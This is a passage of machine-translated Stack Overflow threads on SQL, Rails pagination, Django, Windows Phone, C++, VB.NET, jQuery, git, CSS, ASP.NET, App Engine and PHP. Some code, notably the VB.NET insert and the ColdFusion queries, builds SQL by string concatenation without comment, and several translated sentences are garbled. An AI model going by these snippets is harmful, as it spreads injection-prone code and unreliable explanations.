我想创建一个查询，只给我一个`itemID`，但允许我指定*首选*哪种语言，所以如果我选择`languageID`2，我的查询将只返回以“leItem”开头的项目名称第 4 项除外，它仍然应该给我`item4`

任何想法如何通过 SELECT 实现这一目标？

理论（我试图让它工作）是我创建两个查询，一个用于所有`languageID`匹配 x 的地方，第二个用于表示每个项目（按组或不同），然后合并结果。

* * *

生成表的sql

```
-- Languages
CREATE TABLE [Languages] (
    [id] INT NOT NULL PRIMARY KEY IDENTITY,
    [language] NVARCHAR(20) NOT NULL ,
    [languagecode] NVARCHAR(6) NOT NULL
);

-- Items
CREATE TABLE [Items] (
    [id] INT NOT NULL PRIMARY KEY IDENTITY,
    [ImageId] INT ,
    [lastupdate] DATETIME,
    [isactive] BIT NOT NULL DEFAULT 'TRUE'
);

-- ItemNames
CREATE TABLE [ItemNames] (
    [itemId] INT NOT NULL ,
    [languageId] INT NOT NULL ,
    [name] NVARCHAR(50) NOT NULL ,
    FOREIGN KEY (itemId) REFERENCES Items(id),
    FOREIGN KEY (languageId) REFERENCES Languages(id),
    PRIMARY KEY ([itemId],[languageId])
); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T01:42:52.523

您也许可以使用子查询来解决这个问题。这可能不是解决它的最佳方法，但我会尝试一下。

```
SELECT DISTINCT
  outer.itemid, 
  outer.languageid, 
  outer.name 
FROM 
  table AS outer
WHERE 
  outer.languageid = 2  
  OR NOT EXIST (SELECT * FROM table AS inner WHERE languageid = 2 AND inner.itemid = outer.itemid) 
```

第一个 where 条件是提供属于 languageid = 2 的所有条目，只有当您正在查看的当前项目没有 languageid = 2 的条目时，where 条件的第二部分才返回 true。

[http://dev.mysql.com/doc/refman/5.0/en/exists-and-not-exists-subqueries.html](http://dev.mysql.com/doc/refman/5.0/en/exists-and-not-exists-subqueries.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T15:15:47.433

我会尝试使用`CASE`声明。基本上，这个想法是确定首选语言是否存在，`null`如果不*存在*则返回。这样，您可以利用`ISNULL`返回首选语言（填充时），否则返回最小语言 ID：

```
// replace @preferred with the preferred language id ie 2
SELECT  itn.ItemID, itn.LanguageID, itn.Name
FROM    ItemNames itn INNER JOIN 
        (
            SELECT  itemID, 
                    // use preferred language if it exists
                    // otherwise, use the minimum languageID
                    ISNULL( MIN ( CASE WHEN LanguageID = @preferred THEN LanguageID ELSE NULL END ) 
                                , MIN (LanguageID) 
                          ) AS LanguageID
            FROM   ItemNames 
            GROUP BY itemID
        )
        sel ON sel.ItemID = itn.ItemID AND sel.LanguageID = itn.LanguageID 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T17:12:33.897

这就是我现在的处理方式......

我创建了一个 cffunction 循环遍历查询。它有效，而且因为我是子查询，我认为性能应该没问题。似乎使用数据库端查询对我来说可能太难了。

```
<cffunction name="getLanguageUniqueEntries" output="no" returntype="query" >
    <cfargument name="q" Type="query" required="true">
    <cfargument name="languageId" Type="string" required="true">
    <cfargument name="uniqueColumn" Type="string" required="false" default="ID">

    <!---  Copy structure, assume table has an id column where no item matches -1 --->
    <cfquery dbtype="query" name="newQ"> SELECT * FROM q WHERE #uniqueColumn# = -1 </cfquery>

    <!--- get list of unigue IDs --->
    <cfquery dbtype="query" name="uniquePropertyIDs"> SELECT #uniqueColumn# FROM q GROUP BY #uniqueColumn# </cfquery>

    <!--- loop through unique IDs ---->
    <cfloop query="uniquePropertyIDs">
        <cfset colIdVal = uniquePropertyIDs[uniqueColumn][uniquePropertyIDs.CurrentRow]>

        <!--- find row in language --->
        <cfquery dbtype="query" name="currentLangQ" maxrows="1">
            SELECT * FROM q WHERE #uniqueColumn# = #colIdVal# AND LanguageID = #languageId#
        </cfquery>

        <cfif currentLangQ.recordcount NEQ 0>
            <!--- insert row --->
            <cfquery dbtype="query" name="newQ"> SELECT * FROM newQ UNION SELECT * FROM currentLangQ </cfquery>
        <cfelse>
            <!--- entry in language not found, get a default value --->
            <cfquery dbtype="query" name="anyLangQ" maxrows="1"> SELECT * FROM q WHERE #uniqueColumn# = #colIdVal# ORDER BY LanguageID</cfquery>

            <!--- insert row --->
            <cfquery dbtype="query" name="newQ"> SELECT * FROM newQ UNION SELECT * FROM anyLangQ</cfquery>
        </cfif>

    </cfloop>
    <cfreturn newQ>
</cffunction> 
```

# linux - 我可以在 ubuntu 上杀死 console-kit-dae 进程吗？

> ID：10239065
> 
> 赞同：3
> 
> 时间：2012-04-20T01:30:39.463
> 
> 标签：linux, ubuntu

上面的命令显示了 console-kit-dae 的 2 个进程，每个进程使用 22% 的内存。

我想知道为什么，如果我能杀死他们。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T01:40:21.760

您可以尝试查看这些解释什么是 console-kit-dae 的链接。[consile-kit-dae 论坛](https://bbs.archlinux.org/viewtopic.php?id=58757)和[官方网页](http://www.freedesktop.org/wiki/Software/ConsoleKit)

# ruby-on-rails - 当最后一个到达 will_paginate 和 Rails 3 时，如何获取第一个帖子？

> ID：10239070
> 
> 赞同：0
> 
> 时间：2012-04-20T01:31:22.527
> 
> 标签：ruby-on-rails, ruby-on-rails-3, pagination, will-paginate

我有一堆帖子，我想总是每页显示 3 个。假设我有 4 个帖子，如下所示：

```
post 1
post 2
post 3
post 4 
```

如果我使用 will_paginate （或任何分页插件），每页有 3 个结果，第 1 页将包含：

```
post 1
post 2
post 3 
```

第 2 页将包含

```
post 4 
```

我想让它使第一页包含帖子 1、2 和 3，而第二页将循环回到开头，如下所示：

```
post 4
post 1
post 2 
```

我该如何做到这一点？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T02:17:31.060

WillPaginate 实际上允许您定义它直接使用的集合`WillPaginate::Collection.create`。我认为像下面这样的一些代码应该可以解决问题：

```
@posts = Post.offset((page - 1) * per_page).limit(per_page)
post_count = @posts.count
if post_count < per_page
  @posts = @posts.all + Post.limit(per_page - post_count).all
end

# At this point you have an array of posts. 
# Now we create the WillPaginate::Collection so will_paginate will work.

@posts = WillPaginate::Collection.create(page, per_page) do |pager|
  pager.replace(@posts)
  pager.total_entries = Post.count
  pager
end 
```

# python - Django 模型：我什么时候应该使用@property 装饰器作为属性？

> ID：10239073
> 
> 赞同：6
> 
> 时间：2012-04-20T01:32:09.173
> 
> 标签：python, django

我想知道什么是最佳做法。我一直在使用`@property`装饰器，因为当我想在模板上显示与模型实例相关的内容时，它允许我避免创建自定义上下文变量。

我觉得我的模型太大了。这个可以吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T02:45:54.750

除非您发现自己在一个又一个模型上编写完全相同的代码，否则这不是问题。此时，您应该考虑编写一个将模型作为参数的模板标签。

# windows-phone-7 - 在正在运行的应用程序中检测警报“关闭”事件？

> ID：10239078
> 
> 赞同：3
> 
> 时间：2012-04-20T01:32:46.410
> 
> 标签：windows-phone-7, windows-phone-7.1, windows-phone

我已经构建了一个带有拨动开关的应用程序，该开关向用户指示已安排警报。

如果我的应用程序在警报触发时关闭，并且用户单击“关闭”然后启动我的应用程序，我可以通过 ScheduledActionService.Find 检测到警报已过期并将切换设置为关闭位置。

我遇到的问题是当我的应用程序打开并且警报触发时。在那种情况下，当用户点击关闭并返回到我在后台的应用程序时，我如何检测警报状态的变化？

解除警报时是否有我可以收听的事件？如果没有，有没有办法检测我的应用程序何时因警报对话框而失去/获得焦点？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-21T07:59:16.587

在你的内部`App.Xaml.cs`，你可以订阅你的`Obscured`和`Unobscured`事件`RootFrame`。

```
 RootFrame.Obscured += new EventHandler<ObscuredEventArgs>(RootFrame_Obscured);
    RootFrame.Unobscured += new EventHandler(RootFrame_Unobscured); 
```

当警报弹出时，`RootFrame_Unobscured`将被触发；解雇后，`RootFrame_Obscured`将被解雇。

# c++ - 动态创建类

> ID：10239079
> 
> 赞同：1
> 
> 时间：2012-04-20T01:33:02.353
> 
> 标签：c++, oop

我需要一些建议。我正在阅读一个具有这样输入的文件

001 100 110 000 ... ..

这些是连续的输入和输出对。

现在我需要阅读这些 1 和 0 以进行进一步处理。我需要一个像 input[0]= {0,0,1} input[1] = {1,1,0} ....对于所有输入的数组。我将对输入和输出对进行按位比较、异或或..等。我正在考虑创建一个类，以便在读取输入/输出后我可以创建该类的对象，其中所有必需的函数都将被重载。例如，在这种情况下，对象将是一个由 3 个元素组成的数组，并且仅包含 1 和 0。

现在的问题是，1 和 0 的数量可以变化。是否可以创建一个成员将是未定义大小的数组的类？或者有没有其他办法？

我是新来的。所以，我希望能得到一些帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:45:55.330

使用[std::](http://en.cppreference.com/w/cpp/utility/bitset/bitset)`std::string` bitset和`std::vector`.

```
std::string bits = "001";
std::bitset<3> b(bits); 
```

`std::bitset`已经为您提供了按位运算。

创建`std::vector<std::bitset<3>>`它们并与之合作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T01:35:47.590

使您的数据成员成为`std::vector`. 您可以使用`push_back`将元素添加到末尾，以及其他一些东西。可以像访问数组一样访问元素。那里有很多很好的参考资料。

更好的是，首先使用向量并重载运算符以获取两个向量。

# sql - 插入语句上的 Sql 错误

> ID：10239081
> 
> 赞同：0
> 
> 时间：2012-04-20T01:33:15.990
> 
> 标签：sql, vb.net, ms-access

我正在使用 gridviews Row Updating 将已编辑的字段添加到表中以进行监视。除了一个值外，一切似乎都有效，如下所示。

```
 For i As Integer = 0 To colnum

        If e.OldValues(i).ToString() <> e.NewValues(i).ToString() Then
            Dim uid As Integer = Convert.ToInt32(strUID)

            Dim UpC As OleDbCommand = New OleDbCommand("INSERT INTO tblAud (TN, FN, tID, OldValue, UserID) VALUES ('" + tN + "', '" + fn + "'," + tID + ", '"+ oldValue + "'," + uid + ")", con)

            UpC.ExecuteNonQuery()

        End If
    Next 
```

如果我将用户 ID 显示到文本框中，它会很好地显示 ID，如果我在 sql 中输入一个数字来代替它，它就可以工作。如果我取出用户 ID，sql 也可以工作，但是使用它我得到一个错误“输入字符串的格式不正确。” 此外，所有内容都被添加到数据库中两次，知道为什么会这样吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T01:37:36.313

在单独的变量中创建 SQL 插入字符串。然后您可以在监视窗口中查看它，看看发生了什么。

就像是...

```
Dim SQl as String = 'INSERT INTO tblAud (TN, FN, tID, OldValue, UserID) VALUES ('" + tN + "', '" + fn + "'," + tID + ", '"+ oldValue + "'," + uid + ")"' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T01:37:45.420

> 输入字符串的格式不正确。

一般与转换有关。由于您要将字符串转换为数字，因此这很可能是罪魁祸首。您可以尝试使用 Int32.TryParse 之类的方法来验证数字并在无法解析时显示错误消息。请注意，`Convert.ToInt32`空字符串或 null 也会产生此错误消息。

两次添加到数据库中的所有内容可能是因为您实际上并未`e.OldValues(i)`在 INSERT 查询中使用，而是其他一些名为`oldValue`. 没有更多代码示例很难说，但最好的办法是学习调试工具并观察正在发生的事情。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-22T00:43:58.927

通过将 id 添加到文本框然后在 sql 语句上使用 Textbox.text 使其工作。

# jquery - jQuery if z-index < (less than) 0 then do hover else do something else

> ID：10239083
> 
> 赞同：0
> 
> 时间：2012-04-20T01:33:18.987
> 
> 标签：jquery, attributes, z-index, if-statement

我有几层照片，用不同的 z-index #'s 堆叠在一起：

```
#layer1 {position: absolute; z-index:-1}
#layer2 {position: absolute; z-index:-2} and so on 
```

有相应的菜单项，单击时，隐藏所有照片层并显示其相关的照片层。我通过在背景图像后面设置照片图层的**z-index来做到这一点***（我无法隐藏，因为我需要它们加载并准备好显示）*并让 jquery在单击时 更改**z-index ，然后淡入。**

将鼠标悬停在菜单项上时，会出现预览缩略图，但是在单击以显示图层后，我不想再显示任何预览缩略图。

我假设我可以使用**if/else**语句

这适用于页面加载`if ($("#layer1").css("z-index") < "0") {`
，但是在您单击更改**z-index**后，**if/else**语句仍然认为它是旧的 z-index。这是我正在谈论的一个简单的 js fiddle：http: [//jsfiddle.net/YktAZ/52/](http://jsfiddle.net/YktAZ/52/)
单击**MENU 2**应该触发**else**。

我希望这不会令人困惑。这是我正在开发的实际网站。单击 COVERS & SPREADS 然后**悬停**或**单击**出现的新菜单项：[URL](http://www.fixxed.com/test/gravite)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T02:31:24.767

您的 jsFiddle 没有任何问题，它完全按预期运行。您已经编写了一个语句来执行一些代码*一次*（javascript 不会坐在那里循环您的代码），然后您已经绑定了一个单击处理程序来更改`z-index`图像的。这就是您的点击处理程序所做的一切 - 它*只会*更改图像的 z-index。它不会重新绑定初始悬停或运行任何其他代码来更改任何内容。

如果要更改在代码开头定义的悬停状态，则必须再次运行这些函数。您可以通过将代码放在一个函数中，并在您的点击处理程序中调用它来做到这一点。例子：

```
function swap_hover() {
    if ($("#image").css("z-index") < "0") {
        $("#menu1").hover(function() {
            $(this).css("background-color", "red");
        }, function() {
            $("#menu1").css("background-color", "white");
        });
    }
    else {
        $("#menu1").hover(function() {
            $(this).css("background-color", "blue");
        }, function() {
            $("#menu1").css("background-color", "white");
        });
    }
}

swap_hover();

$("#menu2").click(function() {
    $("#image").css("z-index", "1");

    swap_hover();
}); 
```

jsFiddle 在这里：http: [//jsfiddle.net/YktAZ/53/](http://jsfiddle.net/YktAZ/53/)。一旦你对 javascript 有了更好的理解，你就可以修改这段代码来做你真正需要它做的事情。

# git - 在别名中设置别名

> ID：10239085
> 
> 赞同：0
> 
> 时间：2012-04-20T01:34:11.077
> 
> 标签：git, bash

我试图能够做这样的事情：

```
> function gitb(){ git checkout -b $1; alias $1='git checkout $1'; }
> gitb sample
Switched to a new branch 'sample'
> git checkout master
Switched to branch 'master'
> sample
Switched to branch 'sample' 
```

但是，函数 gitb 的行为不符合预期，因为：

```
> alias sample
alias sample='git checkout $1' 
```

代替

```
> alias sample
alias sample='git checkout sample' 
```

谁能告诉我如何实现我想要的目标？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:42:51.970

了解单引号和双引号之间的区别。

```
function gitb() { git checkout -b $1; alias $1="git checkout $1"; } 
```

# css - CSS 上的选择器分组和上下文选择器示例

> ID：10239088
> 
> 赞同：1
> 
> 时间：2012-04-20T01:34:48.940
> 
> 标签：css

我明天要去考试，我试图理解的含义和答案

选择器分组和上下文选择器

虽然我在谷歌周围搜索了很多来源，但它开始让我感到困惑，因为当我在之前的测试中回答这个问题时，当我使用从互联网上找到的答案时，我得到了错误的答案，但下面的答案是来自我们的教授。

```
a. Selector grouping example 

   td, th, li { property: value; }

b. Contextual Selector example 

   table p { property: value; } 
```

任何人都可以给我更多信息，请提供更多示例，选择器分组和上下文选择器是什么意思。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-20T12:22:00.917

基本上你看到的是以下内容。

为了

```
a. Selector grouping example 

   td, th, li { property: value; } 
```

上面的意思是您希望所有 td、th 和 li 的相同属性具有相同的值

```
b. Contextual Selector example 

   table p { property: value; } 
```

这个是说你想为`<p>`属于`<table>`标签的标签设置值

因此，只要您有 a `<p>`in a `<table>`，它就会生效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-20T01:43:41.580

选择器分组：对应用样式的元素类型进行分组。

Contextual Selector：检查类在html树中的上下文，通过特定的路由将样式分配给元素，同时考虑到树中的深度顺序。

# gridview - asp.net 在gridview中，如果datafield是一个数组，怎么显示呢？

> ID：10239092
> 
> 赞同：1
> 
> 时间：2012-04-20T01:35:04.973
> 
> 标签：gridview

```
grid.DataSource = list; //list is a Question[], each Question contains a QuestionText and Choices[]
grid.DataBind(); 
```

我怎样才能向他们展示：http: [//i.imgur.com/MUQK0.png](http://i.imgur.com/MUQK0.png)
我应该在 asp 代码中编码什么？

```
<asp:GridView ID="OptionsView" runat="server" AutoGenerateColumns="False" >
<Columns>
<asp:BoundField DataField="//here,what should i code?" HeaderText="Options" />
</Columns>
</asp:GridView> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T01:41:15.577

对于这样的自定义输出，您将需要使用`TemplateField`：

```
<asp:TemplateField>
    <ItemTemplate>
        <%-- you can use custom tags here and
             Eval("Property") to get values from the
             data source, or ((Question)Container.DataItem).Property
    </ItemTemplate>
</asp:TemplateField> 
```

对于您的第二列，您将需要第二个显示控件，该控件可以显示多个数据输出，例如 a`ListView`或`Repeater`。例如，您如何在第二列中显示一个无序列的选项列表（这将在 another 中`asp:TemplateField`）：

```
<ul>
<asp:Repeater DataSource='<%#((Question)Container.DataItem).Choices#>' ...
    <ItemTemplate>
        <li><%#Eval("ChoiceText")#></li>
    </ItemTemplate>
</asp:Repeater>
</ul> 
```

# google-app-engine - 如何从命令行关闭 Google App Engine 的本地开发服务器？

> ID：10239093
> 
> 赞同：6
> 
> 时间：2012-04-20T01:35:17.890
> 
> 标签：google-app-engine, gae-eclipse-plugin

我已经`dev_appserver.py`从 Eclipse 运行了本地 GAE 应用程序服务器 ()，然后 Eclipse 崩溃了。所以我不得不杀死 Eclipse 并重新启动它。但是，当 Eclipse 重新启动时，它失去了与仍在运行的 GAE 服务器的连接，我不知道如何关闭它。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-20T06:01:11.293

您必须终止开发服务器的进程。这取决于操作系统。在linux上使用：

```
ps aux| grep java 
kill -9 <process id> 
```

在 Windows 上，您可以使用`tasklist`和`taskkill`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T19:59:52.843

我发现（一个 Windows XP）如果我使用 ant 启动本地服务器，然后尝试用 ^C 杀死它，它不会杀死 JAVA.EXE，

但是当我使用读取“%appEngine_home%\bin\dev_appserver.cmd war”的小批处理文件启动服务器时，当我按下 ^C 时它会杀死它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-04-09T11:34:12.733

我知道为时已晚，但对于这个问题的未来观众来说，在 Windows 中，您可以按 ctrl + c 从命令行终止 Dev App Server。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-04-14T20:31:18.160

打开你的任务管理器，会有一个任务（对我来说是_go_app），如果你结束它，它会结束服务器，转到 URL 的响应将是“服务器突然停止”。寻找正在运行的 python 应用程序，如果您仍然卡在 bash 中并且无法使用您的 shell，您可以关闭这些 python 任务以访问您的 shell，或者您可以尝试 ctrl + \ 对我有用。[![在此处输入图像描述](../Images/d13503509d8b51786ddf5cfbbf1bc95b.png)](https://i.stack.imgur.com/82w4h.png)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-03T09:32:01.793

在 OSX 上，这可以通过显式命名进程并在终端中使用 killall 来实现，例如：

```
killall python /YOUR_PATH_TO_THE_SERVER_RUNTIME/dev_appserver.py 
```

# java - Java Game - 使用矩形的墙壁碰撞检测

> ID：10239094
> 
> 赞同：1
> 
> 时间：2012-04-20T01:35:42.193
> 
> 标签：java, collision

我正在开发一个 java 游戏，我现在正试图用我的瓦片地图进行碰撞检测，但它没有按照我想要的方式工作。我在角色上制作了 4 个矩形。一个在顶部，底部，左侧和右侧。矩形的宽度都是速度的 2 倍。

要检查矩形是否与瓷砖上的矩形相交，我使用此代码

```
if(LeftSide.intersects(Map.colRect[i])){
            MovingLeft = false;
            x_pos+=vel;

        } 
```

要定义矩形，我使用此代码

```
LeftSide = new Rectangle(x_pos,y_pos+(vel*2),(vel*2),spriteHeight-1-(vel*4));
    RightSide = new Rectangle(x_pos+spriteWidth-1,y_pos+(vel*2),(vel*2),spriteHeight-(vel*4)-1);
    UpSide = new Rectangle(x_pos+(vel*2),y_pos,spriteWidth-(vel*4)-1,(vel*2));
    DownSide = new Rectangle(x_pos+(vel*2),y_pos+spriteHeight-1,spriteWidth-(vel*4)-1,(vel*2)); 
```

发生的情况是，当玩家撞到墙壁时，进入墙壁的速度与速度相同，然后被推回墙壁的速度与速度相同。这导致角色在你撞到墙上并按住键时只是来回做一个模糊的动作。

有没有我可以用来解决这个问题的算法？或不同的方法？

角色上的矩形如下所示：![矩形](../Images/34214d3db5de12f38c7e776a19ff3a2e.png)

任何帮助将不胜感激。我真的很想解决这个问题

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:46:29.277

您可能想要对*弹性碰撞进行建模*[，](https://sites.google.com/site/drjohnbmatthews/kineticmodel)[此处](http://www.vobarian.com/collisions/)讨论和说明。

# jquery - 添加/删除类 onClick Jquery

> ID：10239096
> 
> 赞同：0
> 
> 时间：2012-04-20T01:35:47.897
> 
> 标签：jquery

我已经查看了似乎有一百万个示例，说明如何获取用户单击以更改类的链接，同时确保同级链接采用其原始类。我对 jQuery 很陌生，所以当我尝试这些不同的示例时，我承认我迷失了。这是我的CSS：

```
/*active link */
.current {
color: #f48239;
text-decoration: none;
}
/* inactive link*/
.link {
    color: black;
    text-decoration: none;

} 
```

只显示与被点击的链接对应的 div 内容的 jQuery 函数：

```
 $(document).ready(function(){
    $('a').click(function () {
    var divname= this.name;
    $("#"+divname).show("fast").siblings().hide("fast");

    });

    }); 
```

现在是 HTML：

```
 <div id="left">
            <UL><h2>DBACO Projects</h2></UL>
                    <div id="headerspace">
                    </div>              
            <UL ID="links"><LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="QualcommInfo">QUALCOMM BUILDING M PROJECTS</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="StFrancisInfo">ST FRANCIS OF ASSISI CATHOLIC &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;COMMUNITY-PHASE 1</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="YumaInfo">YUMA PIVOT POINT HOTEL AND &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CONFERENCE CENTER</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="RealtyInfo">REALTY INCOME CORPORATE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEADQUARTERS</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="CenterCityInfo">CENTER CITY MARRIOTT</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="PalmInfo">PALM MOUNTAIN RESORT</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="TrailsInfo">THE TRAILS AT PALM SPRINGS</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="OtayInfo">OTAY LOGISTICS CENTER</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="CabrilloInfo">CABRILLO MEDICAL OFFICE BUILDING</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="NorthgateInfo">NORTHGATE COMMUNITY CHURCH</A></h6></LI><BR>
            <LI><h6 style="display: inline;"><A class="link" HREF="#" NAME="LomaInfo">LOMA ALTA VILLAGE MOB</A></h6></LI></UL>
        </div> 
```

任何关于如何点击链接以获取“当前”类同时确保所有其他链接保持在“链接”类中的任何想法都将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-20T01:44:26.407

```
$(document).ready(function() {
    var $links = $('a');
    $links.click(function () {
        $links.removeClass('current').addClass('link');
        $(this).removeClass('link').addClass('current');

        var divname= this.name;
        $("#"+divname).show("fast").siblings().hide("fast");
    });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T01:47:06.527

我不确定你为什么应用“显示”和“隐藏”，但这可能是你想要的。

```
$(document).ready(function(){
    $('a').click(function () {
        $(this)
            .removeClass("link")
            .addClass("current")
            .siblings("a").removeClass("current");
    });
}); 
```

该代码仅更改 css 类。

希望能帮助到你。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-20T01:45:49.350

我建议这样做：http: [//jsfiddle.net/3SR7E/](http://jsfiddle.net/3SR7E/)

CSS：

```
.link.current {
color: #f48239;

}
.link {
color: black;
text-decoration: none;

} 
```

javascript:

```
$(document).ready(function(){
$('a').click(function () {
var divname= this.name;
$("#"+divname).show("fast").siblings().hide("fast");
$("#links li a").removeClass("current");               
    $(this).addClass("current");

});

}); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-20T01:44:34.720

你去[http://jsfiddle.net/gHWWX/4/](http://jsfiddle.net/gHWWX/4/)

```
$(document).ready(function(){
    $('a').click(function () {
        $('a').removeClass('current').addClass('link');
        $(this).removeClass('link').addClass('current');
        var divname= this.name;
        $("#"+divname).show("fast").siblings().hide("fast");
    });
});​ 
```

次要编辑

# ios - 应用内购买以编程方式注册新产品

> ID：10239097
> 
> 赞同：4
> 
> 时间：2012-04-20T01:35:48.677
> 
> 标签：ios, in-app-purchase

有没有办法以编程方式在 iTunesConnect 中注册应用内产品？我想在我的应用程序中有 20 种产品，但是在 iTunesConnect 中创建新的 20 种产品非常痛苦。是否有任何 API 可用于以编程方式执行此操作？

我试图在指南中找到任何信息，但那里没有任何相关信息。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T01:42:12.490

不，您必须在 iTunes Connect 中制作它们。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-20T01:53:26.317

不，因为您的产品必须先经过苹果审查，然后才能出售。

# django - Unable to load abstract profile model?

> ID：10239100
> 
> 赞同：1
> 
> 时间：2012-04-20T01:37:05.313
> 
> 标签：django, abstract-class, user-profile

Up until recently, a project I'm working used one mega UserProfile to handle all profile data for two different types of users. Naturally this was messy, and it was about time to refactor it.

In my attempt to refactor the model, I split the model into Requester and Funder and created an abstract UserProfile model which both subclass:

```
class UserProfile(models.Model):
  class Meta:
    abstract = True

  user = models.OneToOneField(User)

  def __unicode__(self):
      return unicode(self.user)

class Requester(UserProfile):
  def requested(self, event):
    """Check if a user requested an event."""
    return self == event.requester

class Funder(UserProfile):
  osa_email = models.EmailField(null=True) # The e-mail of the contact in OSA
  mission_statement = models.TextField(max_length=256) 
```

And in my settings.py file, I adjusted the AUTH_PROFILE_MODULE.

```
AUTH_PROFILE_MODULE = "app.UserProfile" 
```

The problem is, when hitting a page that uses "User.get_profile()" it breaks, reporting:

```
Unable to load the profile model, check AUTH_PROFILE_MODULE in your project settings 
```

I'm not quite sure what's going on here. According to [the docs](https://docs.djangoproject.com/en/dev/topics/auth/), everything *looks* right.

Can some explain why this fails? (There are a bunch of alternative solutions I've come across, but I'd much prefer to fix this if possible than adopt some hack.)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T01:51:40.800

What you are trying to do it not possible. `AUTH_PROFILE_MODULE` is expecting a concrete model, not an abstract one. Concrete means it has a table and can create instances. An abstract model can only be subclassed.

A logic reason why this not possible it that django has no one of knowing which model instance to return for your user. A Requester? A Funder? Simply being an abstract reference gives django no hints. One approach might be to look into the [contenttypes framework](https://docs.djangoproject.com/en/dev/ref/contrib/contenttypes/) and maybe come up with a generic UserProfile model containing a reference to the proper sub-profile type. You could then remove the abstract=True from your UserProfile, and create a [generic relation](https://docs.djangoproject.com/en/dev/ref/contrib/contenttypes/#generic-relations) to the specific Profile model. `AUTH_PROFILE_MODULE` would then simply reference that single UserProfile, but its instances can then use the `.content_object` to get the specific subobject.

There are many ways I'm sure you could address this problem, but I am just commenting on the reason why this specific approach does not work.

# php - 如何解析从 Google Maps API v3 距离矩阵到 PHP 的 JSON 输出？

> ID：10239106
> 
> 赞同：0
> 
> 时间：2012-04-20T01:38:06.913
> 
> 标签：php, json, google-maps-api-3

我只想将 Google Maps API 距离矩阵的输出转换为 PHP 以进行进一步处理。我不知道如何将距离值返回到变量中。我的数据是[来自 Google Maps API v3 的 JSON 文件](http://maps.googleapis.com/maps/api/distancematrix/json?origins=Vancouver+BC|Seattle&destinations=San+Francisco|Victoria+BC&mode=bicycling&language=fr-FR&sensor=false)。

```
{
   "destination_addresses" : [ "San Francisco, Californie, États-Unis", "Victoria, BC, Canada" ],
   "origin_addresses" : [ "Vancouver, BC, Canada", "Seattle, Washington, États-Unis" ],
   "rows" : [
      {
         "elements" : [
            {
               "distance" : {
                  "text" : "1 703 km",
                  "value" : 1703343
               },
               "duration" : {
                  "text" : "3 jours 19 heures",
                  "value" : 326836
               },
               "status" : "OK"
            },
            {
               "distance" : {
                  "text" : "138 km",
                  "value" : 138267
               },
               "duration" : {
                  "text" : "6 heures 45 minutes",
                  "value" : 24278
               },
               "status" : "OK"
            }
         ]
      },
      {
         "elements" : [
            {
               "distance" : {
                  "text" : "1 451 km",
                  "value" : 1451182
               },
               "duration" : {
                  "text" : "3 jours 4 heures",
                  "value" : 274967
               },
               "status" : "OK"
            },
            {
               "distance" : {
                  "text" : "146 km",
                  "value" : 146496
               },
               "duration" : {
                  "text" : "2 heures 52 minutes",
                  "value" : 10321
               },
               "status" : "OK"
            }
         ]
      }
   ],
   "status" : "OK"
} 
```

我是 javascript 和 JSON 的新手，PHP 经验很少。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-20T02:21:48.667

```
$url = 'http://maps.googleapis.com/maps/api/distancematrix/json?origins=Vancouver+BC|Seattle&destinations=San+Francisco|Victoria+BC&mode=bicycling&language=fr-FR&sensor=false';
$json = file_get_contents($url); // get the data from Google Maps API
$result = json_decode($json, true); // convert it from JSON to php array
echo $result['rows'][0]['elements'][0]['distance']['text']; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-03-09T11:28:10.647

```
$url = 'https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=Hyderabad+Telangana+India&destinations=Mumbai+Maharashtra+India';
